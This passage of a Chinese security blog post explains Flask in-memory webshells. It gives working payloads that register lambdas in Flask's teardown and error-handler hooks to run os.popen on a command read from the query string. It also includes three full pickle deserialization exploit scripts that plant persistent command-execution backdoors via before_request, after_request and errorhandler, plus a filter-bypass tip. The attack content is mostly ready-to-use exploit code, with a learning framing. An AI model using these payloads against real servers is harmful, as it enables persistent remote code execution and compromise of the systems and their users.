<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.teardown_request_funcs.setdefault(<span class="literal">None</span>, []).append(<span class="keyword">lambda</span> :<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&quot;calc&quot;</span>).read())</span><br></pre></td></tr></table></figure>

<p>**不能调用<code>request.args.get()</code>动态执行传入的命令,**但是可以执行注入的代码.<strong>每次刷新网页都会执行</strong>.原因是这个装饰器的触发是在请求被销毁后的.在这个时候上一个HTTP请求帧已经被销毁了,但是可以执行静态命令.</p>
<h2 id="teardown-appcontext的利用"><a href="#teardown-appcontext的利用" class="headerlink" title="@teardown_appcontext的利用"></a>@teardown_appcontext的利用</h2><p>payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.teardown_appcontext_funcs.append(<span class="keyword">lambda</span> x :<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&quot;calc&quot;</span>).read())</span><br></pre></td></tr></table></figure>

<p>同样<strong>不能调用<code>request.args.get()</code>动态执行传入的命令</strong>,但是可以执行注入的代码.<strong>每次刷新网页都会执行</strong>.原因是这个装饰器的触发是在请求被销毁后的.不然会报错</p>
<h2 id="errorhandler-的利用"><a href="#errorhandler-的利用" class="headerlink" title="@errorhandler()的利用"></a>@errorhandler()的利用</h2><p>该装饰器内部定义了一个用于注册错误处理函数的函数</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/02/07/python-flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/6.png"></p>
<p>跟到这个<code>register_error_handler()</code>里边</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/02/07/python-flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/7.png"></p>
<p>可以发现他给这个<code>self.error_hander_spec</code>这个字典里添加了一个函数,就是错误处理函数.</p>
<p>如果我们能控制<code>code</code>和<code>exc_class</code>,我们就可以利用错误处理的逻辑执行我们传入的函数.那么<code>code</code>和<code>exc_class</code>是从哪里来的呢,看656行的<code>self._get_exc_class_and_code</code>,进入这个方法可以发现他返回的是一个元组,元组里有一个错误的类和一个整数</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/02/07/python-flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/8.png"></p>
<p>这里直接调用<code>_get_exc_class_and_code()</code>这个方法然后把他的返回值扔到<code>self.error_hander_spec</code>这个字典里.然后给他赋值我们构造的函数.<code>_get_exc_class_and_code()</code>的形参是一个整数就比较方便调用了.</p>
<p>payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>这个方法是可以直接带出回显的</p>
<h1 id="pickle利用下的payload"><a href="#pickle利用下的payload" class="headerlink" title="pickle利用下的payload"></a>pickle利用下的payload</h1><h2 id="before-request-1"><a href="#before-request-1" class="headerlink" title="before_request"></a>before_request</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(\&quot;sys\&quot;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None, []).append(lambda :__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;gxngxngxn&#x27;)).read())&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br></pre></td></tr></table></figure>

<h2 id="after-request-1"><a href="#after-request-1" class="headerlink" title="after_request"></a>after_request</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;gxngxngxn\&#x27;)).read())\&quot;)==None else resp)&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br></pre></td></tr></table></figure>

<h2 id="errorhandler"><a href="#errorhandler" class="headerlink" title="errorhandler"></a>errorhandler</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>,(<span class="string">&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;gxngxngxn&#x27;)).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br></pre></td></tr></table></figure>

<h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><p>这里参考SSTI的绕过</p>
<ul>
<li><strong><code>url_for</code>可替换为<code>get_flashed_messages</code>或者<code>request.__init__</code>或者<code>request.application</code></strong></li>
</ul>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/10381">新版FLASK下python内存马的研究</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/gxngxngxn/p/18181936">Python 内存马分析</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/13976">新版Flask框架下用钩子函数实现内存马的方式</a></li>
<li><a target="_blank" rel="noopener" href="https://chensonghi.github.io/2024/07/20/Memory-Horse-in-Flask/">flask下的内存马</a></li>
<li><a target="_blank" rel="noopener" href="https://asal1n.github.io/2024/10/18/python%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&&%E5%86%85%E5%AD%98%E9%A9%AC/index.html">一些python RCE利用&amp;&amp;内存马</a></li>
</ul>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://b1uel0n3.github.io">B1ueL0n3</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://b1uel0n3.github.io/2025/02/07/python-flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/">https://b1uel0n3.github.io/2025/02/07/python-flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://b1uel0n3.github.io" target="_blank">B1ueL0n3's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web/">web</a><a class="post-meta__tags" href="/tags/python/">python</a><a class="post-meta__tags" href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/">内存马</a></div><div class="post-share"><div class="social-share" data-image="/img/10.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/02/03/CTF%E4%B8%AD%E7%9A%84IP%E4%BC%AA%E9%80%A0/" title="CTF中的IP伪造"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/4.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">CTF中的IP伪造</div></div><div class="info-2"><div class="info-item-1">在一些CTF比赛常常会考到通过伪造IP获得flag，下面是一些常见的IP伪造的请求头：  X-Forwarded-For:127.0.0.1 Client-ip:127.0.0.1 X-Client-IP:127.0.0.1 X-Remote-IP:127.0.0.1 X-Rriginating-IP:127.0.0.1 X-Remote-addr:127.0.0.1 HTTP_CLIENT_IP:127.0.0.1 X-Real-IP:127.0.0.1 X-Originating-IP:127.0.0.1 via:127.0.0.1 X-Forwarded:127.0.0.1 X-Forwarded-Host:127.0.0.1 True-Client-IP:127.0.0.1 Ali-CDN-Real-IP:127.0.0.1 Cdn-Real-IP:127.0.0.1 Cdn-Src-IP:127.0.0.1 CF-Connecting-IP:127.0.0.1 Proxy-Client-IP:127.0.0.1  </div></div></div></a><a class="pagination-related" href="/2025/02/23/HGAME2025-week1/" title="HGAME2025 week1"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/12.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">HGAME2025 week1</div></div><div class="info-2"><div class="info-item-1">Pacmanjs前端题，发现两个可疑的gift： 12aGFldTRlcGNhXzR0cmdte19yX2Ftbm1zZX0=aGFlcGFpZW1rc3ByZXRnbXtydGNfYWVfZWZjfQ==  分别base64解码： 12haeu4epca_4trgm&#123;_r_amnmse&#125;haepaiemkspretgm&#123;rtc_ae_efc&#125;  随波逐流直接梭，是个栅栏加密：   第一个为真flag BandBomb1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889const express = require(&#x27;express&#x27;);const multer = require(&#x27;multer&#x27;);const fs...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/02/03/CTF%E4%B8%AD%E7%9A%84IP%E4%BC%AA%E9%80%A0/" title="CTF中的IP伪造"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/4.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-03</div><div class="info-item-2">CTF中的IP伪造</div></div><div class="info-2"><div class="info-item-1">在一些CTF比赛常常会考到通过伪造IP获得flag，下面是一些常见的IP伪造的请求头：  X-Forwarded-For:127.0.0.1 Client-ip:127.0.0.1 X-Client-IP:127.0.0.1 X-Remote-IP:127.0.0.1 X-Rriginating-IP:127.0.0.1 X-Remote-addr:127.0.0.1 HTTP_CLIENT_IP:127.0.0.1 X-Real-IP:127.0.0.1 X-Originating-IP:127.0.0.1 via:127.0.0.1 X-Forwarded:127.0.0.1 X-Forwarded-Host:127.0.0.1 True-Client-IP:127.0.0.1 Ali-CDN-Real-IP:127.0.0.1 Cdn-Real-IP:127.0.0.1 Cdn-Src-IP:127.0.0.1 CF-Connecting-IP:127.0.0.1 Proxy-Client-IP:127.0.0.1  </div></div></div></a><a class="pagination-related" href="/2025/02/23/HGAME2025-week1/" title="HGAME2025 week1"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/12.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-23</div><div class="info-item-2">HGAME2025 week1</div></div><div class="info-2"><div class="info-item-1">Pacmanjs前端题，发现两个可疑的gift： 12aGFldTRlcGNhXzR0cmdte19yX2Ftbm1zZX0=aGFlcGFpZW1rc3ByZXRnbXtydGNfYWVfZWZjfQ==  分别base64解码： 12haeu4epca_4trgm&#123;_r_amnmse&#125;haepaiemkspretgm&#123;rtc_ae_efc&#125;  随波逐流直接梭，是个栅栏加密：   第一个为真flag BandBomb1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889const express = require(&#x27;express&#x27;);const multer = require(&#x27;multer&#x27;);const fs...</div></div></div></a><a class="pagination-related" href="/2025/03/02/XXE%E5%AD%A6%E4%B9%A0/" title="XXE学习"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/1.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-02</div><div class="info-item-2">XXE学习</div></div><div class="info-2"><div class="info-item-1">XMLXXE是基于XML的攻击，所以在学习XXE前需了解什么是XML。 简介XML（Extensible Markup Language）：与HTML类似，是一种标记语言，但与HTML不同的是，XML 被设计用来传输和存储数据，而HTML 被设计用来显示数据。XML 仅仅是纯文本，更重要的是，通过 XML 可以发明自己的标签，因为 XML 没有预定义的标签。 作用 把数据从 HTML 分离 通过 XML，数据能够存储在独立的 XML 文件中。这样就可以专注于使用 HTML 进行布局和显示，并确保修改底层数据不再需要对 HTML 进行任何的改变。  简化数据共享 XML 数据以纯文本格式进行存储，因此提供了一种独立于软件和硬件的数据存储方法。 这让创建不同应用程序可以共享的数据变得更加容易。  简化数据传输 通过XML，可以在不兼容的系统之间轻松的交换数据。  简化平台的变更 升级到新的系统（硬件或软件平台），总是非常费时的。必须转换大量的数据，不兼容的数据经常会丢失。 XML 数据以文本格式存储。这使得 XML...</div></div></div></a><a class="pagination-related" href="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/" title="ctfshow 2025元旦渗透赛复现"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/3.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-01</div><div class="info-item-2">ctfshow 2025元旦渗透赛复现</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/toux.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">B1ueL0n3</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">14</div></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-number">1.</span> <span class="toc-text">概念</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E4%B8%8A%E4%B8%8B%E6%96%87%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6"><span class="toc-number">2.</span> <span class="toc-text">请求上下文管理机制</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">3.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#add-url-rule%E7%9A%84%E5%B1%80%E9%99%90"><span class="toc-number">4.</span> <span class="toc-text">add_url_rule的局限</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#before-request"><span class="toc-number">5.</span> <span class="toc-text">before_request</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#after-request"><span class="toc-number">6.</span> <span class="toc-text">after_request</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Flask%E4%B8%AD%E7%9A%84%E5%85%B6%E4%BB%96%E9%92%A9%E5%AD%90%E5%87%BD%E6%95%B0"><span class="toc-number">7.</span> <span class="toc-text">Flask中的其他钩子函数</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#before-request-after-request%E5%92%8C-teardown-request-teardown-appcontext%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">7.1.</span> <span class="toc-text">@before_request&#x2F;@after_request和@teardown_request&#x2F;@teardown_appcontext的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#teardown-request%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">7.2.</span> <span class="toc-text">@teardown_request的利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#teardown-appcontext%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">7.3.</span> <span class="toc-text">@teardown_appcontext的利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#errorhandler-%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">7.4.</span> <span class="toc-text">@errorhandler()的利用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pickle%E5%88%A9%E7%94%A8%E4%B8%8B%E7%9A%84payload"><span class="toc-number">8.</span> <span class="toc-text">pickle利用下的payload</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#before-request-1"><span class="toc-number">8.1.</span> <span class="toc-text">before_request</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#after-request-1"><span class="toc-number">8.2.</span> <span class="toc-text">after_request</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#errorhandler"><span class="toc-number">8.3.</span> <span class="toc-text">errorhandler</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">9.</span> <span class="toc-text">绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">10.</span> <span class="toc-text">参考</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/" title="SQL注入总结(超详细)"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/6.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SQL注入总结(超详细)"/></a><div class="content"><a class="title" href="/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/" title="SQL注入总结(超详细)">SQL注入总结(超详细)</a><time datetime="2025-04-24T13:20:56.000Z" title="发表于 2025-04-24 21:20:56">2025-04-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/04/03/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/" title="Java类加载机制"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/7.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Java类加载机制"/></a><div class="content"><a class="title" href="/2025/04/03/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/" title="Java类加载机制">Java类加载机制</a><time datetime="2025-04-03T13:17:48.000Z" title="发表于 2025-04-03 21:17:48">2025-04-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/31/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/" title="Java动态代理"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/12.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Java动态代理"/></a><div class="content"><a class="title" href="/2025/03/31/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/" title="Java动态代理">Java动态代理</a><time datetime="2025-03-31T13:56:38.000Z" title="发表于 2025-03-31 21:56:38">2025-03-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/30/Java%E5%8F%8D%E5%B0%84/" title="Java反射"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Java反射"/></a><div class="content"><a class="title" href="/2025/03/30/Java%E5%8F%8D%E5%B0%84/" title="Java反射">Java反射</a><time datetime="2025-03-30T12:27:08.000Z" title="发表于 2025-03-30 20:27:08">2025-03-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/27/IDEA%E4%BD%BF%E7%94%A8%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/" title="IDEA使用配置教程"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/9.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="IDEA使用配置教程"/></a><div class="content"><a class="title" href="/2025/03/27/IDEA%E4%BD%BF%E7%94%A8%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/" title="IDEA使用配置教程">IDEA使用配置教程</a><time datetime="2025-03-27T14:14:51.000Z" title="发表于 2025-03-27 22:14:51">2025-03-27</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/4.jpg);"><div id="footer-wrap"><div class="copyright">&copy;2025 By B1ueL0n3</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"></div><script src="/js/title.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="90" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>